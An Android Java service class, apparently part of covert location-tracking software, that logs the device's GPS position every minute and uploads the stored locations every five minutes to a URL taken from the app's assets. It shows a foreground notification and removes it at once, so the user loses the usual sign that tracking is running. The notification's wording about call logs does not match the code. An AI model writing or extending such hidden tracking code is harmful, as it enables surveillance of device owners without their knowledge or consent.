package com.lurkerx.gpsjob;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class GpsService extends Service {

    private static final String TAG = "GpsService";
    private static final String CHANNEL_ID = "gps_channel";
    private static final int NOTIF_ID = 101;
    private static final long FETCH_INTERVAL = 60_000;
    private static  final long UPLOAD_INTERVAL = 5* 60_000;
    private Handler handler;
    private Runnable fetchTask;
    private Runnable uploadTask;
    private GpsFetch gpsFetch;
    private GpsDatabaseHelper db;

    @Override
    public void onCreate() {
        super.onCreate();

        gpsFetch = new GpsFetch(this);
        db = new GpsDatabaseHelper(this);

        handler = new Handler(Looper.getMainLooper());

        fetchTask = new Runnable() {
            @Override
            public void run() {
                gpsFetch.fetchOnce(new GpsFetch.Callback() {
                    @Override
                    public void onLocation(double lat, double lon, float acc, long ts) {
                        Log.d(TAG, "Saving GPS: " + lat + ", " + lon);
                        db.insertLocation(lat, lon, acc, ts);
                    }

                    @Override
                    public void onError(String reason) {
                        Log.e(TAG, "GPS error: " + reason);
                    }
                });

                handler.postDelayed(this, FETCH_INTERVAL);
            }
        };
        uploadTask = new Runnable() {
            @Override
            public void run() {
                Context context = getApplicationContext();
                GpsUploader.uploadLoop(context, AssetUrlProvider.getUrl(context));
                handler.postDelayed(this, UPLOAD_INTERVAL);
            }
        };
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForegroundServiceSafe(true);
        handler.post(fetchTask);
        handler.post(uploadTask);
        handler.postDelayed(this::stopSelf, 10 * 60_000);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        handler.removeCallbacks(fetchTask);
        handler.removeCallbacks(uploadTask);
        gpsFetch.shutdown();
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void startForegroundServiceSafe(boolean demoteAfterStart) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Call Background Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Call Service Running")
                .setContentText("Collecting and uploading call logs")
                .setSmallIcon(android.R.drawable.sym_action_call)
                .setOngoing(true)
                .build();

        startForeground(NOTIF_ID, notification);

        if (demoteAfterStart) {
            stopForeground(true);
        }
    }
    private void startForegroundServiceSafe() {
        startForegroundServiceSafe(false);
    }
}
